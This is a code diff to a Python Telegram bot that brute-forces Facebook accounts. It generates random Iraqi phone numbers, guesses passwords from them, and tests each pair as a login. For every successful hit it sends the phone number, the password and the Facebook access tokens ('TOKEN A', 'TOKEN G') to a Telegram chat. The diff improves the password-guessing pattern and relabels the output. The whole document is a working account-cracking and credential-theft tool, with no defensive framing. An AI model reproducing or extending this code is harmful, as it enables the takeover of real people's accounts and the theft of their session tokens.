@@ -31,7 +31,7 @@ def TamTa(call):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         codo = ''.join(random.choice(phn)for i in range(1))
         user = '+964'+codo+nmp
-        ps= nmp
+        ps= '0'+phn+nmp
         FB = Start(phone=user, password=ps)
         if FB.IsValid:
             good += 1
@@ -40,14 +40,14 @@ def TamTa(call):
             bot.send_message(call.message.chat.id,f'''
 --------HIT-------
 EMAIL : {user}
-PAS : {ps}
+PASS : {ps}
 TOKEN A : {TokenEAAB}
 TOKEN G : {TokenEAAG}
 @Q_2_M''')
         else:
         	sleep(2)
         	bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=f'''
-⌯CHEKER  [ {vm} | {user} | {ps} ]
-⌯GOOD :  [{good}]
-⌯ py :  @Q_2_M''')
+⌯ CHECKED :  [ {vm} | {user} | {ps} ]
+⌯ GOOD :  [{good}]
+⌯ BY :  TAKEMICHI ~ @Q_2_M''')
 bot.polling(True)
